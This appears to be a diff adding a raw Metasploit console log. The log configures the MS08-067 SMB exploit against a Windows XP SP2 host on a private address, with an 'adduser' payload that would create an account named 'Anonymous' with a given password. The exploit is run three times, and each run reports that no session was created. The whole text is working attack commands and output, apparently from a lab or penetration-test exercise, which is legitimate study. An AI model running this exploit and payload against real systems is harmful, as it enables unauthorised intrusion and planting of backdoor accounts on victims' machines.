+PASS => 123@Anonymous
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.0.116    yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/adduser):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   CUSTOM                     no        Custom group name to be used instead of default
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   PASS      123@Anonymous    yes       The password for this user
+   USER      Anonymous        yes       The username to create
+   WMIC      false            yes       Use WMIC on the target to resolve administrators group
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
+[*] 192.168.0.116:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
+[*] 192.168.0.116:445 - Attempting to trigger the vulnerability...
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
+[*] 192.168.0.116:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
+[*] 192.168.0.116:445 - Attempting to trigger the vulnerability...
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
+[*] 192.168.0.116:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
+[*] 192.168.0.116:445 - Attempting to trigger the vulnerability...
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > 
+
